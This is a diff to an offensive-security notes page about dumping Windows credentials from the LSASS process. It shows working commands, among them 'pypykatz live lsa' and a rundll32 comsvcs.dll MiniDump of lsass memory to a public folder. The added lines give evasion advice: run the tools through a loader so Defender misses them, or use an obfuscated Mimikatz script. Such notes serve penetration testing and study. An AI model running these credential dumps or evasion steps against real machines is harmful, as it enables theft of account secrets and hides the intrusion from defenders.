@@ -3,8 +3,10 @@
 ## LSASS
 
 {% hint style="warning" %}
-high chances of detection
+High chances of detection. Always use the Loader.exe to use these. Otherwise, it will be detected by the defender.
 {% endhint %}
+
+Use [impacket ](https://github.com/fortra/impacket)if you are using a Linux machine as an attacker machine. Instead of Mimikatz a obfuscated version called **Invoke-Mimi.ps1**(inside _Tools_ folder) can be used too.
 
 ### Kerberos encryption keys
 
@@ -30,10 +32,10 @@ pypykatz.exe live lsa
 # Using comsvcs.dll
 tasklist /FI "IMAGENAME eq lsass.exe"
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
-<lsass process ID> C:\Users\Public\lsass.dmp full 
+<lsass process ID> C:\Users\Public\lsass.dmp full 
 ```
 
-### Logon Passwords&#x20;
+### Logon Passwords
 
 This usually shows recently logged on user and computer credentials.
 
